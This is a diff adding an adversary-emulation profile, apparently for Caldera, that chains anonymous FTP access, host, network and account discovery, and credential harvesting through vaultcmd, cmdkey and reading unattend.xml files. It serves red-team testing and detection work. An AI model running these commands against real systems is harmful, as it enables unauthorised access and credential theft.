@@ -1,0 +1,113 @@
+id: f03eb5c3-1cd6-4962-9494-7f27ad26902f
+name: FTP-IIS-Discovery-Chain
+description: FTP Anonymous Access → Network & System Discovery → Credential Artifact Hunt
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 94d4dcf8-438a-4204-8e07-5f01ad63ebad
+- dca8b042fcdffcc1f5cddcff4122c434
+- 8649e49e-fabf-5faf-8a2a-efb664c33dbb
+- bd527b63-9f9e-46e0-9816-b8434d2b8989
+- 6334877e8e3ba48f7835d4856d90a282
+- c0177717b47f2cd07949186523fa3c6b
+- 10ce4e4c0a8d29ead8968da8156d8358
+- 780cde60c956ccbff24c43ff7b7e70ea
+- e06fb51c7690053f4bee3efd998a621b
+abilities:
+ 94d4dcf8-438a-4204-8e07-5f01ad63ebad:
+  name:   FTP Anonymous Check
+  tactic:  initial-access
+  technique_name:  "Valid Accounts"
+  technique_id:  T1078
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       echo open #{windows.target.ip} > C:\ftp_cmd.txt && echo user anonymous anon@anon.com >> C:\ftp_cmd.txt && echo dir >> C:\ftp_cmd.txt && echo bye >> C:\ftp_cmd.txt && ftp -n -s:C:\ftp_cmd.txt > C:\ftp_out.txt && type C:\ftp_out.txt && findstr /C:"230" C:\ftp_out.txt >nul && del C:\ftp_cmd.txt C:\ftp_out.txt
+ dca8b042fcdffcc1f5cddcff4122c434:
+  name:  System Information Discovery
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       systeminfo && reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
+ 8649e49e-fabf-5faf-8a2a-efb664c33dbb:
+  name:  Local Network Configuration Discovery
+  tactic:  unknown
+  technique_name:  "Unknown Technique"
+  technique_id:  T0000
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       ipconfig /all && route print && netsh interface show interface
+ bd527b63-9f9e-46e0-9816-b8434d2b8989:
+  name:  Current User
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       whoami
+   - sh:
+     platform: linux
+     command: |
+       whoami
+   - psh:
+     platform: windows
+     command: |
+       whoami
+ 6334877e8e3ba48f7835d4856d90a282:
+  name:  Enumerate all accounts on Windows (Local)
+  tactic:  discovery
+  technique_name:  "Account Discovery: Local Account"
+  technique_id:  T1087.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user && dir c:\Users\ && cmdkey.exe /list && net localgroup "Administrators" && net localgroup "Users"
+ c0177717b47f2cd07949186523fa3c6b:
+  name:  ATHPowerShellCommandLineParameter -Command parameter variations
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop
+ 10ce4e4c0a8d29ead8968da8156d8358:
+  name:  Access Saved Credentials via VaultCmd
+  tactic:  credential-access
+  technique_name:  "Credentials from Password Stores: Windows Credential Manager"
+  technique_id:  T1555.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       vaultcmd /listcreds:"Windows Credentials" & vaultcmd /listcreds:"Web Credentials" /all & exit 0
+ 780cde60c956ccbff24c43ff7b7e70ea:
+  name:  Access unattend.xml
+  tactic:  credential-access
+  technique_name:  "Unsecured Credentials: Credentials In Files"
+  technique_id:  T1552.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       type C:\Windows\Panther\unattend.xml 2>nul & type C:\Windows\Panther\Unattend\unattend.xml 2>nul & echo unattend.check.done=true
+ e06fb51c7690053f4bee3efd998a621b:
+  name:  System Network Connections Discovery
+  tactic:  discovery
+  technique_name:  "System Network Connections Discovery"
+  technique_id:  T1049
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       netstat -ano && net use && net sessions 2>nul
